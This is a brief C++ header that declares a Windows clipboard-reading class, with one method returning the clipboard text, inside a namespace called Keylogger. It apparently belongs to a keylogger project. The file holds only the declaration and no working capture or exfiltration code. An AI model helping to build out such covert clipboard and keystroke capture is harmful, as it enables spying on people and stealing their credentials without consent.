#ifndef CLIPBOARD_HANDLER_WINDOWS_H
#define CLIPBOARD_HANDLER_WINDOWS_H

#include "IClipboardHandler.h"

namespace Keylogger {

class ClipboardHandlerWindows : public IClipboardHandler {
 public:
    std::string getClipboardString();
};

}

#endif // CLIPBOARD_HANDLER_WINDOWS_H